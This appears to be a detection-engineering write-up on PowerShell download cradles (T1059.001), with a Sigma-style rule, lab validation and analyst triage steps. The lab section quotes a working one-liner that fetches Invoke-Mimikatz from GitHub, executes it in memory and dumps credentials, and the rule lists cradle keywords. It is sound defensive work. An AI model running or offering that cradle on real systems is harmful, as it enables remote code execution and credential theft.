# T1059.001-DL — PowerShell Download Cradle (IEX + WebClient)

## Hypothesis
Adversaries using PowerShell download cradles — short scripts that fetch a remote payload via `WebClient.DownloadString` / `Invoke-WebRequest` and immediately execute it in memory via `IEX` (Invoke-Expression) — to stage second-stage malware without writing a file to disk. The cradle is often the entirety of what runs in `powershell.exe -Command`, while the real payload exists only in the fetched script body and is reflected in the PowerShell Script Block log rather than the process command line.

## Threat actor context
Used by: Emotet, TrickBot, IcedID, Cobalt Strike default beacon, PowerSploit / Invoke-Mimikatz, and most commodity loaders. The download cradle is the single most common PowerShell-based initial-execution pattern observed in phishing campaigns and is the default loader primitive in dozens of public offensive frameworks.

## Telemetry required
- **Sysmon EventID 1** (ProcessCreate) — covers inline one-liners where
  `WebClient` / `DownloadString` / `IEX` appears in `CommandLine`
- **PowerShell EventID 4104** (ScriptBlockLogging) — covers multi-line
  downloaded scripts where the cradle body is reflected in
  `ScriptBlockText`
- Both event sources are required for full coverage: EID 1 catches
  short inline invocations, EID 4104 catches the actual cradle body
  when it is fetched separately and piped into `IEX`
- Detection depends on **Script Block Logging being enabled** — without
  it, the cradle body is invisible to telemetry

## Why standard detection misses this
A naive `powershell.exe` process creation alert fires on every PowerShell
launch. The download cradle pattern is invisible to command-line-only
telemetry when the cradle is multi-line — the actual `DownloadString` /
`IEX` calls live in a fetched script body, not in the spawning
`powershell.exe` CommandLine. Endpoint agents without Script Block
Logging enabled see only a benign-looking `powershell.exe` invocation
and miss the cradle entirely. Detection requires either parsing the
CommandLine for cradle keywords (covers inline patterns) or enabling
Script Block Logging to see the multi-line cases.

## Detection logic
```yaml
detection:
  selection_scriptblock:
    ScriptBlockText|contains:
      - 'DownloadString'
      - 'DownloadFile'
      - 'WebClient'
      - 'Invoke-WebRequest'
      - 'IEX'
      - 'Invoke-Expression'

  filter_legitimate:
    ScriptBlockText|contains:
      - 'Chocolatey'
      - 'NuGet'
      - 'PSGallery'
      - 'https://download.microsoft.com'
      - 'https://internal-repo.company.com'

  condition: selection_scriptblock and not filter_legitimate
```

## Lab validation
- ART Test: `Invoke-AtomicTest T1059.001 -TestNumbers 1`
- ART Test Name: Mimikatz
- Alert fired: Yes — **PowerShell Script Block Logging EID 4104** (not EID 1)
- ScriptBlockText confirmed:
  `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds`
- Wazuh showed 2 hits — the script body was logged across 2 ScriptBlock records
- Mimikatz output visible in the VM, showing credential dump attempt
  (failed because the VM is not domain-joined)
- Script Block Logging was confirmed enabled during this test

## Filter rationale
The `filter_legitimate` block excludes well-known software distribution
URL prefixes and package managers that legitimately use `WebClient` /
`Invoke-WebRequest` in their bootstrap scripts. Chocolatey, NuGet, and
PowerShell Gallery all use these cmdlets for legitimate package
retrieval; matching on the URL prefix is more reliable than matching on
the cmdlet alone. Internal corporate repository URLs should be added to
this list as the environment matures to suppress known-good
administrative activity.

## Analyst triage guidance
On alert, check `ScriptBlockText` and the URL fetched in Wazuh:
- If the URL is a `raw.githubusercontent.com`, `pastebin.com`, or
  attacker-controlled domain — escalate immediately
- A `DownloadString` from `Chocolatey.org` / `PSGallery` / an internal
  repo followed by `Invoke-Expression` of an unknown script is suspicious
  — review the script body and the parent process
- Cross-reference with EID 3 (network connection) immediately after the
  alert — outbound HTTPS to non-corporate domains is high-confidence
  malicious
- Two consecutive alerts within seconds of each other (initial fetch +
  Invoke-Mimikatz reflection) is the canonical Mimikatz-via-cradle pattern
